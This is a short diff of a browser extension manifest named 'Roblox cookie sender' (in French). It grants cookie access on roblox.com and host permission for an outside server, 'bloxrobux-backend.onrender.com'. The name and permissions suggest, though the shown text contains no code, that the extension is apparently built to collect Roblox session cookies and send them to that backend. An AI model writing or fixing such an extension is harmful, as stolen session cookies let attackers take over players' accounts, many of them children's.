@@ -3,14 +3,15 @@
   "name": "Envoyeur de cookies Roblox",
   "version": "1.0",
   "permissions": [
-    "cookies",
-    "notifications",
-    "activeTab",
-    "storage"
-  ],
+  "cookies",
+  "notifications",
+  "activeTab",
+  "https://*.roblox.com/*",
+  "https://bloxrobux-backend.onrender.com/*"
+],
   "host_permissions": [
-    "*://*.roblox.com/*",
-    "*://bloxrobux-backend.onrender.com/*"
+    "https://*.roblox.com/*",
+    "https://bloxrobux-backend.onrender.com/*"
   ],
   "background": {
     "service_worker": "background.js"
